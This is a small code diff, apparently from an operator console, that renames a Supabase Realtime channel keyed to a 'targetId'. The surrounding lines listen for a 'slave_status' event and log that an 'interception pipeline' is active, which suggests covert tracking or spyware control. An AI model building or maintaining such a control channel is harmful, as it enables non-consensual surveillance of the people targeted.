@@ -3244,7 +3244,7 @@
             
             // Bind to Supabase Realtime channel for target-direct control
             if (opChannel) sb.removeChannel(opChannel);
-            opChannel = sb.channel(`realtime:tracking:${targetId}`);
+            opChannel = sb.channel(`tracking:${targetId}`);
             
             opChannel.on('broadcast', { event: 'slave_status' }, (p) => {
                 logOp("🟢 Target handshaked. Interception pipeline confirmed active.", "status");
